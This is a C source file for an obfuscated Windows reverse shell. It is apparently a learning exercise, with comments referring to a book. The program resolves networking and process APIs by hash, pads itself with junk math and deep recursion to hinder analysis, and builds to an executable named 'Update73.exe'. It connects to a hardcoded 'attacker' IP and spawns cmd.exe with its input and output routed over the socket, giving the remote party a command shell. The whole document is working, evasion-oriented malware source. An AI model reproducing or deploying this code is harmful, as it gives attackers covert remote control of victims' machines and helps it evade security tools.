/*
    Obfuscated Reverse Shell w/ API Hashing and Recursion
    15 Mar 2025
    Eric

    To build: i686-w64-mingw32-g++ 07_overflow.c -o Update73.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
*/


#include <winsock2.h>           // Sockets https://learn.microsoft.com/en-us/windows/win32/api/winsock2/
#include <windows.h>
#include <stdio.h>              // C standard input/output
#include <math.h>
#pragma comment(lib, "w2_32")   // tells linker to use ws2_32.lib 


//variables
WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;                //https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
PROCESS_INFORMATION processInfo;

typedef int (WSAAPI *WSAStartup_t)(WORD, LPWSADATA);
typedef SOCKET (WSAAPI *WSASocket_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
typedef int (WSAAPI *WSAConnect_t)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);

typedef int (WINAPI *CreateProcess_t)(LPCSTR, LPSTR,
  LPSECURITY_ATTRIBUTES,
  LPSECURITY_ATTRIBUTES,
  BOOL, DWORD, LPVOID, LPCSTR,
  LPSTARTUPINFOA, LPPROCESS_INFORMATION
);

int recFunction(int n) {
  // Base case
  if (n <= 0) {
    return 0;
  }
  // Recursive call
  return n + recFunction(n - 1);
}

int generate_key(int number) {
    volatile int x = number;
    x += 1;
    x -= 1;
    x *= 2;
    x /= 2;
  
    // Additional complex math operations
    double y = 2.5;
    double z = 3.7;
    double result = 0.0;
  
    // Perform math operations
    result = sqrt(pow(y, 2) + pow(z, 2)); // Calculate square root of sum of squares
    result = sin(result); // Calculate sine of the result
    result = cos(result); // Calculate cosine of the result
    result = tan(result); // Calculate tangent of the result
  
    // Use the result to perform more operations
    for (int i = 0; i < 10; ++i) {
      result *= i;
      result /= (i + 1);
      result += i;
    }
  
    // Use the final result to perform some conditional operations
    if (result > 100) {
      result -= 100;
    } else {
      result += 100;
    }

    return result;
  }

int wow(){
  int number = 8888;
  int number2 = 6666;
  int number3 = 9999;

  number = number * 2;
  number = number / 4;

  number3 = number3 / 3;

  number2 = number * number3;
  number3 = number2 - number;

  return number;
}

DWORD calcHash(char *string) {
  size_t stringLength = strnlen_s(string, 50);
  DWORD hash = 0x35;
  for (size_t i = 0; i < stringLength; i++) {
    hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
  }
  return hash;
}

static LPVOID getAPIAddr(HMODULE h, DWORD hash) {
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);
  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
    if (calcHash(pFuncName) == hash) {
      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
  }
  return nullptr;
}

int main(int argc, char* argv[]){
    volatile int x = generate_key(0);

    // attacker connection info
    char *attackerIP = "10.0.3.4";
    short attackerPort = wow();

    int result = recFunction(1000000);

    HMODULE hWS2_32 = LoadLibrary("ws2_32.dll");


    WSAStartup_t st = (WSAStartup_t)getAPIAddr(hWS2_32, 0x006633390);
    WSASocket_t  so = (WSASocket_t)getAPIAddr(hWS2_32, 0x006d964c1);
    WSAConnect_t co = (WSAConnect_t)getAPIAddr(hWS2_32, 0x0056cc854);


    // init socket library, version 2.2
    st(MAKEWORD(2,2), &socketData);

    // create TCP IPv4 socket
    // https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketw
    // book uses (unsigned int)NULL instead of 0 for group and flags, which I have no idea why
    mainSocket = so(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    x = generate_key(1);

    // build IPv4 IP:PORT connection struct
    connectionAddress.sin_family = AF_INET;
    connectionAddress.sin_port = htons(attackerPort);
    connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

    // connect
    co(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

    x = generate_key(2);

    // process info
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
    memset(&startupInfo,0, sizeof(startupInfo));    // load empty struct into memory
    startupInfo.cb = sizeof(startupInfo);           // struct size
    startupInfo.dwFlags = STARTF_USESTDHANDLES;      // additional info to in, out, err handles
    // most important line, this sets the input, output and error streams to go through the socket
    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

    x = generate_key(3);


    HMODULE k_32 = LoadLibrary("kernel32.dll");
    LPVOID addr = getAPIAddr(k_32, 0x00609ea21);
    CreateProcess_t crproc = (CreateProcess_t)addr;

    // spawn cmd shell, sending streams over socket
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
    crproc(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);
    
    x = generate_key(2);
    
    exit(0);
}